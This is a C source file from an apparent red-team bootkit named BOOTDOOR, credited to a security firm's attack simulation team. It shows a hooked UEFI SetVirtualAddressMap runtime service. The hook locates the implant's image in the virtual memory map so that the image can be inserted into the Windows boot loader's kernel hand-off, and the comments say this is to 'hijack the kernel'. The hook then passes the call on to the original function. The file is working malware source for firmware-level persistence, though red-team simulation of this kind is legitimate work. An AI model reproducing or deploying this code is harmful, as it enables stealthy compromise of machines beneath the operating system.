/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Acquires the virtual address of our image
 * in memory so that can hijack the kernel.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI SetVirtualAddressMap( UINTN MemoryMapSize, UINTN DescriptorSize, UINT32 DescriptorVersion, EFI_MEMORY_DESCRIPTOR * VirtualMap )
{
	UINTN			Len = 0;
	EFI_PHYSICAL_ADDRESS	Ptr = 0;

	PRNTBL			Tb1 = NULL;
	PEFTBL			Tb2 = NULL;
	EFI_MEMORY_DESCRIPTOR	*Map = NULL;

	Tb1 = C_PTR( G_PTR( RnTbl ) );
	Tb2 = C_PTR( G_PTR( EfTbl ) );
	Map = C_PTR( VirtualMap );

	/* Enumerate memory mappings */
	for ( INT Idx = 0 ; Idx < MemoryMapSize / DescriptorSize ; ++Idx ) {
		Len = Map->NumberOfPages * 0x1000;
		Ptr = Map->PhysicalStart;

		/* Is a pointer to our ImageAddrPhy? */
		if ( ( U_PTR( Tb1->ImageAddrPhy ) >= U_PTR( Ptr ) ) && ( U_PTR( Tb1->ImageAddrPhy ) < U_PTR( U_PTR( Ptr ) + Len ) ) ) {
			/* Convert to its virtual form so we can insert it as a pointer in OslArchTransferToKernel */
			Tb1->ImageAddrVir = C_PTR( U_PTR( ( U_PTR( Tb1->ImageAddrPhy ) - U_PTR( Ptr ) ) + Map->VirtualStart ) );
		};
		/* To the next entry */
		Map = C_PTR( U_PTR( Map ) + DescriptorSize );
	};
	/* Execute original function */
	return ( ( __typeof__( SetVirtualAddressMap ) * ) ( ( ( PEFTBL ) G_PTR( EfTbl ) )->SetVirtualAddressMap ) )(
				MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap
	);
};
